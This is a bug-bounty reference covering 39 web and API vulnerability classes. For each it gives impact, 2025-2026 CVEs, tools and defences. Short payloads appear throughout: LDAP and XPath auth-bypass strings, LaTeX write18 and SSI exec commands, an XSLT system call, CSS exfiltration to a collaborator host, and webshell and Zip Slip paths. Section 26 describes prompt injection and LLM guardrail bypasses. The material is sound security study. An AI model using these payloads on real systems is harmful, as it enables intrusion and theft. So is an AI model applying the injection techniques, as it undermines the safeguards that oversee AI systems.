# Web/API Security: research reference - part 2 (2025-2026)

> Continuation of `research.md`. The remaining 39 categories of the 64. Companion document to `operational-part2.md`. The "why and where from": impact, current 2025-2026 techniques, recent CVEs, sources.

## TL;DR part 2
- **The hottest fresh stuff:** SAML signature-wrapping returned as a cluster of criticals via parser-differential (PortSwigger "The Fragile Lock", Dec 2025; ruby-saml/samlify CVE), CSPT took shape as a standalone class (CSPT2CSRF/CSPT2XSS, Doyensec), ORM Leak - a new class from elttam (Black Hat EU "ORMageddon") + Django CVE-2025-64459 (SQLi via ORM, 9.1), reverse-proxy path confusion gave an unauth auth-bypass in PAN-OS (CVE-2025-0108), prompt injection - #1 in the OWASP Top 10 for LLM 2025.
- **Supply chain** (dependency confusion / typosquatting) - mass incidents in 2025: Shai-Hulud 2.0, GhostAction (3325 secrets), the compromise of chalk/debug (billions of downloads).
- **Stable classics** (Clickjacking, CSV, Tabnabbing, LDAP/XPath, SSI/ESI, Type Juggling, Zip Slip) change little, but are encountered regularly and work well in chains.

---

## 1. API Key Leaks
A key leak is a frequent and quick source of criticals: a key in a JS bundle, git history, mobile application or Wayback directly gives access to billing, PII, sending mail/SMS or administrative operations. The main rule for bug bounty: **validate the key and its scope before reporting** (with a minimal safe request, without abuse) - an invalid/expired key usually isn't paid, and impact is determined precisely by the key's permissions. Triage the key type via `keyhacks`. IOC: commits with secrets, followed by rotation. Detection tools: trufflehog, gitleaks, secretmagpie. Defense - secret scanning in CI, scoped/short-lived keys, moving secrets out of the front-end into a backend proxy.

## 2. Brute Force & Rate Limit
The absence or bypassability of rate-limit leads to account takeover (brute-forcing passwords/OTP/reset tokens) and logic abuse (promo codes, invites). Typical bypasses: rotating `X-Forwarded-For`/`X-Real-IP` (if the limit is by IP and trusts the header), resetting the counter by changing case/adding a dot/`%00` to the login, distributed brute-forcing. **The main fresh multiplier is the single-packet attack** for bypassing the attempt limit on a numeric OTP (see sec. 16 of part 1): dozens of attempts "in one packet" slip past the counter. Defense - lockout/exponential backoff per account+IP, CAPTCHA, long random tokens.

## 3. Clickjacking
Usually low severity on its own; impact appears when there is a sensitive one-click action (changing email, deletion, OAuth consent). Root cause - the absence of `frame-ancestors`/`X-Frame-Options`. In 2025 the current subcategory is **"double-clickjacking"** (Paulos Yibelo, 2025): a bypass of protections designed for a single frame/click, by exploiting double-click timing and swapping the window between clicks. Defense - `frame-ancestors 'none'`/`'self'` + `SameSite` cookies.

## 4. Client Side Path Traversal (CSPT)
Took shape as a standalone class thanks to research by Doyensec (Maxence Schmitt, "Exploiting Client-Side Path Traversal - CSRF is Dead, Long Live CSRF", OWASP Global AppSec 2024) and the CSPT2CSRF whitepaper. The essence: the front-end builds a path to the API from a user value (param/hash/stored), `../` after normalization redirects `fetch` to a different endpoint, and the browser itself attaches cookies/CSRF tokens/JWT - that is, **existing CSRF protections are bypassed**. The impact depends on the reachable sink: DELETE-CSRF opens powerful vectors (deleting an admin's MFA), POST/PUT - state change. Recent CVEs: **Grafana OSS CVE-2025-4123/6023** (traversal in `/public/plugins/` -> loading an attacker-controlled plugin, chained with open-redirect; with Image Renderer -> SSRF), Mattermost CVE-2023-45316/6458. Tools: Doyensec CSPTBurpExtension, Gecko (Vitor Falcao), CSPTPlayground. Sources: Doyensec blog (including "Bypassing File Upload Restrictions To Exploit CSPT", Jan 9, 2025), HackTricks. Defense - don't build paths from input, allowlist endpoints.

## 5. CRLF Injection
Injecting `%0d%0a` into a parameter that ends up in a response header leads to HTTP response splitting, header injection (`Set-Cookie`, `Location`), reflected XSS via an injected body, cache poisoning and log injection. Filter bypasses - encoding variants (`%0a`/`%0d`/overlong `%E5%98%8A%E5%98%8D`); a number of backends and nginx sinks accept decoded `\r\n` (especially in unsafe variables `$uri`/`$arg_*` - see sec. 28). In the HTTP/2 era classic response splitting is rarer, but header injection in proxied headers and CRLF in reverse-proxy configs remain relevant. Tools: crlfuzz, nuclei. Defense - strip CR/LF, don't reflect input into headers.

## 6. CSS Injection
Even without JS, a "pure" CSS injection allows exfiltrating data from DOM attributes: attribute selectors (`input[value^="a"]{background:url(//collab/a)}`) leak the value character by character - classically stealing CSRF tokens and secrets, which when chained yields account takeover. Blind variants - `@import`, font ligatures, recursive `@import` for sequential leaking. Especially dangerous where CSP is absent and secrets sit in `value`/data attributes. The combination with CSPT (sec. 4) and XS-Leaks (sec. 37) is a separate research direction in 2025. Defense - CSP, style sanitization, don't store secrets in attributes.

## 7. CSV Injection (Formula Injection)
A field that ends up in an exported CSV/XLSX and begins with `=`,`+`,`-`,`@`,Tab,CR is interpreted as a formula when the victim opens it. Impact: exfiltration (`=HYPERLINK`, `=WEBSERVICE`) and RCE via DDE (`=cmd|'/c calc'!A1`) upon user confirmation (modern Excel shows a warning, but social engineering works). Severity varies - often treated as "requires victim action". Defense - prefix dangerous starting characters with `'`, escape during file generation.

## 8. CVE Exploits
A meta-category, not a vulnerability: the discipline of "fingerprint the version -> find a CVE/PoC -> check applicability -> exploit carefully". The key is an exact version (headers, favicon-hash, static files, CHANGELOG) and prioritization by **CISA KEV** (what is actually exploited). Tools: nuclei, searchsploit, Metasploit, NVD/GHSA, Shodan. For bug bounty it's important: an n-day on an outdated component is a valid find, but check the scope (often known-CVEs are out of scope). Defense - patch management, KEV monitoring, virtual patching.

## 9. DNS Rebinding
A TOCTOU between DNS resolution (for validation) and the actual request: a domain with TTL=0 alternates a public IP -> `127.0.0.1`/internal, passing the allowlist on the "good" answer and landing on the internal one during the request. Targets - internal APIs/IoT without `Host` validation, and cloud metadata (see sec. 4 of part 1, Craft CMS CVE-2025-68437/bypass). Tools: Singularity of Origin (NCC), whonow. Defense - `Host` validation, DNS pinning, resolve+request in one step, egress filtering.

## 10. DOM Clobbering
When the sanitizer cuts out `<script>` but lets through `id`/`name`, the attacker overwrites JS globals/properties with named elements (`<a id=x>`, nested `<form id=x><input name=y>`, collections via duplicate `id`) - and through this escalates to XSS or a CSP bypass. A recent example - **CVE-2025-1647** (Bootstrap 3 Tooltip/Popover, a `sanitizeHtml` bypass via clobbering -> XSS); PortSwigger showed clobbering of `script.src`/config for a CSP bypass. Tool: DOM Invader (clobbering mode). Defense - explicit variable declaration, namespacing, `Object.freeze`, a sanitizer that strips `id`/`name`, Trusted Types.

## 11. Denial of Service
In bug bounty it is most often out-of-scope or accepted as a "probability" without actual takedown. Classes: algorithmic complexity (ReDoS sec. 27, hash collisions), decompression (zip/gzip bomb, XML billion-laughs entity expansion), resource exhaustion (large/deeply nested payloads, GraphQL depth/alias sec. 19 of part 1). Detection - scaling of response time on a graduated load, not to the point of failure. Defense - size/depth/timeout limits, complexity limiting, RE2, rate limiting, decompression with a limit. *Test extremely carefully and only within scope.*

## 12. Dependency Confusion
An attack on package resolution: a public package with the name of an internal one intercepts the installation due to default registry/version priority. 2025 - the year of supply chain: **Shai-Hulud 2.0**, **GhostAction** (Sep 5, 2025, GitGuardian: 327 users, 817 repos, exfiltration of 3325 secrets - PyPI/npm/DockerHub tokens), the compromise of a maintainer account and injection into 18 popular npm packages (chalk, debug - billions of downloads), termncolor/colorinal (PyPI). The classic - pytorch torchtriton (2022). Triggers: install-time (postinstall/setup.py) and runtime. **Ethical testing in bug bounty** - only a canary package with a safe OAST beacon and a higher version, without a malicious payload, strictly within the program. Tools: confused, snync, Socket.dev. Defense (by consensus): namespace ownership (claim names publicly as a stub), a single private index/scoped registry, version pinning, a cooldown on new packages. Sources: GitGuardian, Netlas, thebrightbyte playbook.

## 13. Encoding Transformations
Not a vulnerability, but a universal bypass toolkit feeding all injection classes: URL/double-URL, Unicode NFKC normalization, overlong UTF-8, fullwidth (`／`,`＜`), HTML entities, base64/hex/mixed-case. The root of exploitation - the front-end/WAF decodes differently than the backend (a parser differential at the encoding level). Related to Ghost Bits (sec. 9 of part 1) and JSON-based SQLi (sec. 2 of part 1). Tools: Hackvertor (Burp), CyberChef. Defense - canonicalization before validation, uniform decoding throughout the chain.

## 14. External Variable Modification
A PHP-specific class: `extract($_REQUEST)`, `import_request_variables`, `$$var`, register_globals-style allow overwriting internal variables with request parameters (`?authenticated=1`, `?isAdmin=1`) before the check -> auth bypass/logic flaw, overwriting include paths. Found in legacy PHP. Defense - don't apply `extract()`/dynamic variables to user input, use explicit assignment.

## 15. Google Web Toolkit (GWT)
Niche but underestimated: GWT-RPC serialization exposes methods and parameters that aren't in the visible API. Recon via `*.nocache.js`/`*.cache.html`/`X-GWT-Permutation`, parsing the RPC payload and serialization policy (`.gwt.rpc`) reveals hidden methods -> IDOR, injections into the underlying calls, type manipulation. Tool: GWTMap. Defense - server-side authorization on every RPC method, don't rely on "obscurity".

## 16. HTTP Parameter Pollution (HPP)
Duplicating a parameter (`?id=1&id=2`) is handled differently by servers (first/last/array/concatenation), which gives a WAF bypass (the payload in the second occurrence, if the WAF looks at the first), a logic/authorization bypass due to a parsing discrepancy front-end<->back-end, and client-side HPP (injecting `&`/`%26`) corrupts generated links. Combines well with other injections for bypassing filters. Defense - uniform parsing, explicit validation, reject duplicates.

## 17. Headless Browser
A category about attacking server-side rendering (HTML->PDF, screenshot, preview via puppeteer/Chromium): XSS in the rendered content gives execution in the renderer's context -> local file read (`<iframe src="file:///etc/passwd">`), SSRF (`<img src="http://169.254.169.254/...">`), a leak into the resulting PDF. Overlaps with SSRF (sec. 4 of part 1) and SSTI (sec. 5 of part 1); cf. pandoc CVE-2025-51591. Defense - don't run with `--no-sandbox`, isolate the renderer, block `file://`/internal, timeouts, prohibit external resources.

## 18. Hidden Parameters
Undocumented parameters (`debug=true`, `admin=1`, `source=true`, `test=1`) change behavior and often open up debug disclosure, privilege escalation, or serve as an entry point for Mass Assignment (sec. 22 of part 1) and ORM Leak (sec. 25). Discovery - Arjun, Param Miner, x8 + wordlists and grepping JS. A high-ROI reconnaissance step before other classes. Defense - allowlist accepted parameters, disable debug in production.

## 19. Insecure Management Interface
Exposed admin panels and consoles are consistently high impact: Spring Boot Actuator (`/env`, `/heapdump` with secrets, `/gateway` -> RCE chains), Jolokia/MBean, Tomcat Manager, Jenkins, Kibana, phpMyAdmin. Recon - fuzzing common paths + Shodan/Censys, non-standard ports; default creds often work. Tools: nuclei, ffuf, feroxbuster. Defense - restriction by IP/VPN/auth, disabling sensitive actuator endpoints, changing defaults.

## 20. Insecure Randomness
Predictable tokens (reset, session, OTP, CSRF, invite) from a weak PRNG (`Math.random()`, `mt_rand()`, time-seeded, increment) allow predicting the victim's token -> ATO. Detection - collecting many tokens and analyzing entropy/sequence (Burp Sequencer). Defense - CSPRNG (`secrets`, `crypto.randomBytes`, `SecureRandom`), sufficient length, not time-based.

## 21. Insecure Source Code Management (.git/.svn leaks)
An exposed `/.git/` (check `/.git/HEAD`) allows fully downloading the repository (git-dumper, GitTools Dumper/Extractor, dvcs-ripper) - sources, secrets, commit history with deleted keys. `.DS_Store` (ds_store_exp) reveals a directory listing; similarly `.svn/`, `.hg/`, `.bzr/`. A very frequent and quick find. Tools: git-dumper, GitTools, nuclei (exposures). Defense - block dot-files/directories on the web server, don't deploy VCS directories.

## 22. Java RMI
An exposed RMI registry (1099) and JMX give powerful vectors: deserialization via RMI (passing a gadget object, see sec. 11 of part 1), JMX MLet -> loading a remote MBean -> RCE, default/no-auth JMX, remote method guessing. Tools: remote-method-guesser (rmg), BaRMIe, ysoserial, nmap rmi-scripts. Defense - don't expose RMI/JMX externally, JMX auth+TLS, deserialization filters.

## 23. LDAP Injection
Injection into an LDAP filter gives auth bypass (`*)(uid=*))(|(uid=*`, `*)(|(password=*))`), wildcard enumeration (`*`) and blind boolean exfiltration of attributes character by character. Found in corporate applications with LDAP/AD authentication. Defense - escaping LDAP metacharacters, parameterizing filters, validation.

## 24. LaTeX Injection
Injection into LaTeX compilation (PDF generators, scientific/reporting services): file read (`\input{/etc/passwd}`, `\lstinputlisting`, `\verbatiminput`), file writing and **RCE with shell-escape enabled** (`\immediate\write18{id}`). Impact - from file reading to full RCE. Defense - disable `--shell-escape`, sandbox compilation (container/restricted-mode), allowlist commands, timeout.

## 25. ORM Leak
A new class from elttam (Alex Brown, the series "plORMbing your Django/Prisma ORM" and "Leaking More Than You Joined For", Black Hat EU "ORMageddon"; James Kettle called the Prisma part a "beautiful example of abusing framework features to make timing attacks that work in the wild"). The root cause: the application lets the user control the **field name and/or operator** of a filter (`filter(**request.data)`, Prisma `where: req.query.filter`), and the ORM developer didn't restrict which fields are queryable. Techniques: Django field-lookups (`password__startswith`, `__regex`, JSONField `__has_key`), a boolean oracle character by character, relational filtering (pivoting through one-to-one/many-to-many to sensitive fields of related tables), error-based via a ReDoS predicate on MySQL, calibration to the DB collation. Recent CVEs: **Django CVE-2025-64459** (Nov 5, 2025; `_connector`/`_negated` in `Q(**params)`/`filter(**request.GET)` -> full-blown SQLi, CISA ADP CVSS 9.1; fixed 4.2.26/5.2.8), Authentik CVE-2024-42490, Ransack (Ruby). Tools: plormber (time-based), elttam semgrep-rules (Django/Prisma/Beego/EF). According to elttam: against the backdrop of thinning SQLi, applications that unintentionally allow filtering by sensitive fields are increasingly common. Defense - allowlist queryable fields (never password/token), server-controlled query logic, don't expand a user dict into an ORM call.

## 26. Prompt Injection (LLM)
#1 in the **OWASP Top 10 for LLM Applications 2025** (LLM01). Direct - overriding instructions/changing the role/extracting the system prompt; **indirect** - instructions hidden in external content (web/PDF/email/resume) that ends up in the context via RAG or a tool-call (Greshake et al. 2023; "goal hijacking"). In agentic systems the main impact is **abuse of tool-calls** (actions on behalf of the user, data exfiltration via a markdown-image/link to one's own domain). Guardrail bypass - base64/emoji/multilingual encoding and character-injection (Hackett et al., "Bypassing LLM Guardrails", LLMSEC 2025: both character injection and algorithmic AML evasion break detectors). Taxonomies: CrowdStrike classes (overt/indirect), Arcanum Prompt Injection Taxonomy 1.5 (Jason Haddix; dimensions intents/techniques/evasions/inputs). Tools: garak, PromptFoo. Defense (defense-in-depth, OWASP LLM01:2025 + NIST AI RMF GenAI Profile): separation of data/instructions (spotlighting), least-privilege for tool-calls + human-in-the-loop on sensitive actions, output-channel filtering (no auto-fetch), sanitization of external content. Fully preventing jailbreaks requires changes at the model-training level - at the application level there are no guarantees.

## 27. Regular Expression (ReDoS)
Catastrophic backtracking in a regex with nested quantifiers (`(a+)+`, `(.*)*`) or overlapping alternatives (`(a|a)*`) with a near-match string with a breaking character at the end gives exponential time -> DoS in a single request. The vector - a server-side regex over user input (email/URL validation, search) or user-provided regexes. Also used as an error-oracle in ORM Leak (sec. 25). Tools: regexploit, recheck. Defense - RE2 (linear complexity), atomic/possessive groups, a match timeout, an input length limit.

## 28. Reverse Proxy Misconfigurations
The "auth on the proxy -> proxying to a back-end with different behavior" architecture systematically produces header smuggling and path confusion. Key techniques: **nginx alias traversal** (no trailing slash in `location`/`alias` -> `/assets../config.php`), location-matching nuances (adding a byte `\x85`/`%85` breaks `location = /admin`), CRLF in unsafe variables, `proxy_pass` without a slash (`/api../` -> traversal to the back-end). The flagship case of 2025 - **PAN-OS CVE-2025-0108** (Assetnote): a discrepancy in normalization nginx<->Apache<->PHP allowed dropping `X-pan-AuthCheck` and, via an internal redirect, executing a hidden PHP script = unauth auth-bypass on the management interface. The historical base - Orange Tsai (BH 2018, "Breaking Parser Logic"). Closely related to Request Smuggling (sec. 19 of part 1). Tools: bypass-url-parser (laluka), Kyubi, ffuf. Defense - a trailing slash in `location`/`alias`, uniform normalization front-end<->back-end, cleaning `X-*`/hop-by-hop headers, IP whitelisting for management.

## 29. SAML Injection
SAML bugs give a full auth-bypass (logging in as an arbitrary/admin user) - the top impact in enterprise SSO. The classic - **XML Signature Wrapping (XSW)**: add an unsigned assertion next to the signed one and force the logic to read it (SAML Raider implements 8 XSW techniques). The 2025 revival - **parser differential**: ruby-saml uses two parsers (REXML and Nokogiri) that build different trees from the same XML, which reopens signature wrapping. The CVE cluster: **CVE-2025-25291/25292** (signature wrapping), **CVE-2025-25293** (DoS on compressed messages), and the incomplete-fix **CVE-2025-66567** (namespace handling, CVSS 10.0) + **CVE-2025-66568** (fixed in ruby-saml 1.18.0); **samlify CVE-2025-47949** (Node, >200K weekly downloads, CWE-347). PortSwigger's "The Fragile Lock" (Dec 2025) demonstrates a **Golden SAML Response** via libxml2 canonicalization: the signature of an empty string is reused for an arbitrary Response (affected ruby-saml 1.12.4, php-saml, xmlseclibs; **not** affected XMLSec Library and Shibboleth xmlsectool). Also: comment-injection in NameID (old, the text after `<!---->` is lost during canonicalization), the absence of Audience/Recipient/time validation, XXE in SAML. Tool: Burp SAML Raider. Defense - a single XML parser, schema hardening + `disallow-doctype`, signing the entire assertion with reference verification, validation of Audience/Recipient/NotOnOrAfter, updating libraries.

## 30. SSI / ESI Injection
**SSI**: in `.shtml`/Apache `mod_include` or reflected HTML - `<!--#exec cmd="id"-->` (RCE), `<!--#include virtual=...-->`, `<!--#echo var=...-->`. **ESI** (edge-side includes in Varnish/Akamai/Fastly/Squid): `<esi:include src="http://collab/"/>` gives SSRF, an injected ESI from user input -> XSS/HttpOnly bypass, `<esi:debug/>` reveals data. ESI injection (Louis Dion-Marcil, GoSecure, BH 2018) is relevant where the cache trusts ESI tags in the backend's response. Defense - don't process SSI/ESI from user input, disable `exec`, restrict `esi:include` to trusted sources.

## 31. Tabnabbing (Reverse Tabnabbing)
`target="_blank"` without `rel="noopener noreferrer"` gives the opened page access to `window.opener` -> rewrite `window.opener.location` to phishing (the user returns to a "spoofed" original tab). Modern browsers apply `noopener` by default for `_blank`, which reduces relevance, but old clients and explicit `window.open` without noopener remain. Usually low severity (a phishing vector). Defense - `rel="noopener noreferrer"` on all `_blank`.

## 32. Type Juggling
PHP loose comparison (`==`): magic hashes of the form `0e\d+` compare as equal (`"0e123" == "0e456"` -> both "0"), `strcmp(array,"str")` -> NULL -> `NULL == 0` is true, `in_array` without strict - all of this gives an auth bypass when comparing passwords/hashes/tokens, especially via a JSON API with typed input (`{"password": true/0}`). **Important about PHP 8**: the behavior of `0 == "abc"` was changed - it is now **false** (the string is no longer coerced to 0), so `0=="string"` bypasses don't work, but magic-hash (`0e...`) and array-tricks persist. Defense - strict comparison `===`/`hash_equals()`, type checking, don't compare secrets via `==`.

## 33. Upload Insecure Files
High impact (often direct RCE via a webshell). Bypasses combine: alternative extensions (`.phtml`/`.php5`/`.pht`/`.phar`), double extension, Content-Type spoof, magic-bytes (`GIF89a;` + code), null-byte (legacy), case/special characters/trailing dots, **.htaccess override** (`AddType ... .jpg`), polyglots and **PHP in a PNG IDAT chunk** (survives resize via `imagecopyresized`/`imagecopyresampled`), ImageMagick exploits (ImageTragick) during server-side processing, path-traversal in the file name (see Zip Slip sec. 39). Confirmation - execution via URL (`uploads/shell.php?cmd=id`). The baseline material - PortSwigger Web Security Academy, OWASP Unrestricted File Upload, the Intigriti guide (May 2025), HackTricks. Defense - allowlist extensions + magic-bytes + re-encoding, random names, storage outside the webroot, disabling script execution in the upload directory, forced download via CDN.

## 34. Virtual Hosts (vhost enumeration)
A single IP can host vhosts that are absent from public DNS (internal/staging/admin). Fuzzing the `Host` header (`ffuf -H "Host: FUZZ.target" -fs <baseline>`, gobuster vhost, VHostScan) reveals hidden applications with potentially weak protection -> expanding the attack surface. Often the first step to access internal panels (sec. 19). Defense - default-vhost 404/403, don't host internal on a public IP without network restriction.

## 35. Web Sockets (CSWSH)
**Cross-Site WebSocket Hijacking**: if the WS handshake relies only on cookies and doesn't check `Origin` and doesn't carry a CSRF token, the attacker page opens `wss://target` with the victim's cookies and reads/sends messages - the functional equivalent of CSRF + data reading. Additionally: message tampering (injections into the WS channel bypass the HTTP WAF) and the absence of auth at the message level. Tools: Burp WebSocket history/Repeater, ws-harness. Defense - `Origin` validation on the handshake, a CSRF token in the upgrade request, authentication/authorization at the message level, don't trust WS input.

## 36. XPATH Injection
Injection into an XPath query (applications with XML storage): auth bypass (`' or '1'='1`), blind boolean exfiltration character by character (`substring(//user[1]/password,1,1)='a'`), structure enumeration (`count()`, `name()`, `string-length()`). Less common than SQLi, but where the data is in XML it's a working vector. Tool: xcat (automating blind XPath). Defense - parameterized/precompiled XPath with variables, escaping, validation.

## 37. XS-Leaks
A class of side-channel attacks that infer cross-origin information (logged-in status, the presence of a search result, user-id) bypassing the Same-Origin Policy. Techniques: **frame counting** (`window.open(target).length` - the number of frames reveals state), **timing** (cache vs no-cache, user existence), **error events** (`img.onload`/`onerror`, `<script>`/`<link>`), **CSP redirect detection** (CSP on your own page blocks -> there was a redirect), **postMessage** broadcast, and new 2025 variants (**CSS injection XS-Leaks**, focus events for probing an ID). The root is in the design of the web (the interaction of features), so the defenses are opt-in headers. Sources: XS-Leaks Wiki (xsleaks.dev), MDN, PentesterLab. Defense - `Cross-Origin-Opener-Policy: same-origin`, `Cross-Origin-Resource-Policy`, **Fetch Metadata** (`Sec-Fetch-*`), uniform responses (uniform 404, size padding, stable redirects), `SameSite` cookies.

## 38. XSLT Injection
Injection into an XSLT transformation: engine detection (`system-property('xsl:version')`), file read (`unparsed-text('/etc/passwd')`, `document('/etc/passwd')`), SSRF (`document('http://...')`), and **RCE via extension functions** (PHP `php:function('system','id')`, Java/.NET) when they are enabled. Impact - from file reading to RCE. Defense - disable extension functions and `document()`/external, sandbox the processor, update libxslt/Saxon.

## 39. Zip Slip
Path-traversal during archive extraction (ZIP/TAR/JAR): entries with names `../../../../var/www/html/shell.php` are written outside the extraction directory -> a webshell in the webroot, overwriting cron/`authorized_keys`/configs -> RCE. Also symlink variants in TAR and Windows `..\\`. The class was described by Snyk (2018), but it regularly produces criticals: **CVE-2024-57726** (SimpleHelp - admin-uploaded ZIPs with `../` write outside the root; added to CISA KEV, Jan 2025), **CVE-2024-13059** (AnythingLLM via multer). Tools: evilarc, slipit. Defense - canonicalization and verification that the final path is inside the target directory, rejecting `../`/absolute paths in entry names.

---

## Caveats (part 2)
- **2025-2026 CVEs** (ruby-saml/samlify, Grafana CSPT, Django ORM CVE-2025-64459, Bootstrap CVE-2025-1647, PAN-OS CVE-2025-0108, SimpleHelp CVE-2024-57726) verify against NVD/GHSA/vendor advisories before using in a report - versions/statuses may have changed.
- **The sums and scales of supply chain incidents** (GhostAction 3325 secrets, chalk/debug "billions of downloads") are cited from sources (GitGuardian, Netlas) for illustration, not as a guarantee.
- **PHP 8 type juggling**: check the PHP version - the behavior of `==` has changed, and some classic bypasses won't work on newer versions.
- **Browser-dependent classes** (Tabnabbing, XS-Leaks, Clickjacking, CSWSH) depend on the browser version and settings and on the presence of opt-in headers on the target; modern defaults often partially mitigate them.
- **Destruction/load**: RCE vectors (LaTeX `\write18`, upload shells, RMI/JMX, XSLT extensions), DoS (ReDoS, decompression bombs), supply-chain and prompt-injection tests - only within an authorized scope and with maximally safe probes (OAST/canaries), without a malicious payload and mass operations.
- Together with `research.md` (24 categories) this document covers all 64 PayloadsAllTheThings categories.

## Key sources (part 2)
- **PayloadsAllTheThings** - github.com/swisskyrepo/PayloadsAllTheThings
- **PortSwigger - The Fragile Lock (SAML bypass)** - portswigger.net/research/the-fragile-lock
- **ruby-saml releases / advisories** - github.com/SAML-Toolkits/ruby-saml/releases
- **Doyensec - CSPT2CSRF whitepaper** - doyensec.com/resources/Doyensec_CSPT2CSRF_Whitepaper.pdf
- **Doyensec - CSPT file upload** - blog.doyensec.com/2025/01/09/cspt-file-upload.html
- **elttam - ORM Leak (Leaking More Than You Joined For)** - elttam.com/blog/leaking-more-than-you-joined-for
- **Django CVE-2025-64459 analysis** - hiddeninvestigations.net/blog/django-cve-2025-64459-critical-sql-injection-in-the-orm-explained
- **Assetnote - PAN-OS path confusion (CVE-2025-0108)** - assetnote.io/resources/research/nginx-apache-path-confusion-to-auth-bypass-in-pan-os
- **nginx alias traversal** - dev.to/blue_byte/path-traversal-via-alias-misconfiguration-in-nginx-3pbg
- **OWASP Top 10 for LLM 2025 - Prompt Injection** - genai.owasp.org/llmrisk/llm01-prompt-injection/
- **Bypassing LLM Guardrails (LLMSEC 2025)** - aclanthology.org/2025.llmsec-1.8/
- **Dependency confusion / supply chain 2025** - blog.gitguardian.com/dependency-confusion-attacks/ , netlas.io/blog/supply_chain_attack/
- **File upload advanced guide (Intigriti)** - intigriti.com/researchers/blog/hacking-tools/insecure-file-uploads
- **XS-Leaks Wiki** - xsleaks.dev
- **HackTricks** - book.hacktricks.xyz
